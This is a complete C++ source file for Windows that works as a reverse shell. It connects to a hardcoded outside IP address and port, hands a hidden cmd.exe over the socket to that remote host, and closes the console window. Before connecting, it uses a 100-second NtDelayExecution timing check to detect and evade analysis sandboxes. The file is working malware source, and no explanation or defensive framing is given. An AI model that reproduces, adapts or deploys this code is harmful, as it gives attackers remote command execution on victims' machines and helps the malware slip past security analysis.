#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCKAPI_    // Prevent inclusion of winsock.h in windows.h

#include <winsock2.h>
#include <Windows.h>
#include <winhttp.h>
#include <winternl.h>
#include <shellscalingapi.h>
#include <shlobj.h>

// System Headers
#include <iphlpapi.h>
#include <setupapi.h>
#include <devguid.h>
#include <TlHelp32.h>
#include <psapi.h>

// Standard C/C++ Headers
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <cstring>
#include <cstdint>
#include <time.h>
#include <io.h>
#include <strsafe.h>
#include <stdbool.h>
// Library Links
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Shcore.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")


using namespace std;

bool ExecutionDelay() {
    // Get the system uptime before the delay
    ULONGLONG uptimeBeforeSleep = GetTickCount64();

    // Define the function pointer for NtDelayExecution
    typedef NTSTATUS(WINAPI *PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
    PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");

    // Check if the function pointer was successfully retrieved
    if (!pNtDelayExecution) {
        return false; // Handle the error as needed
    }

    // Set up the delay time (100 seconds)
    LARGE_INTEGER delay;
    delay.QuadPart = -10000 * 100000; // Negative value for relative delay in 100-nanosecond intervals

    // Call NtDelayExecution to perform the delay
    pNtDelayExecution(FALSE, &delay);

    // Get the system uptime after the delay
    ULONGLONG uptimeAfterSleep = GetTickCount64();

    // Check if the actual sleep time was less than expected
    if ((uptimeAfterSleep - uptimeBeforeSleep) < 100000) {
        return false;
    }

    return true;
}


bool isSafeEnvironment()
{
    return ExecutionDelay();
}

int main(int argc, char *argv[])
{
    if (!isSafeEnvironment())
    {
        Sleep(15000);
        return 1;
    }
    string ip = "3.85.20.60";
    short port = 6125;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        return 1;
    }

    SOCKET WSock;
    WSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, (unsigned int)nullptr, (unsigned int)nullptr);

    struct sockaddr_in hax;
    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    hax.sin_addr.s_addr = inet_addr(ip.c_str());

    if (WSAConnect(WSock, (SOCKADDR *)&hax, sizeof(hax), nullptr, nullptr, nullptr, nullptr) != 0)
    {
        closesocket(WSock);
        WSACleanup();
        return 1;
    }

    STARTUPINFOA sui;
    PROCESS_INFORMATION pi;
    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)WSock;
    sui.wShowWindow = SW_HIDE;

    string process = "cmd.exe";
    if (CreateProcessA(nullptr, (LPSTR)process.c_str(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &sui, &pi))
    {
        HWND hWnd = FindWindowA("ConsoleWindowClass", nullptr);
        if (hWnd != nullptr) {
            PostMessage(hWnd, WM_CLOSE, 0, 0);
        }
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    closesocket(WSock);
    WSACleanup();

    return 0;
}
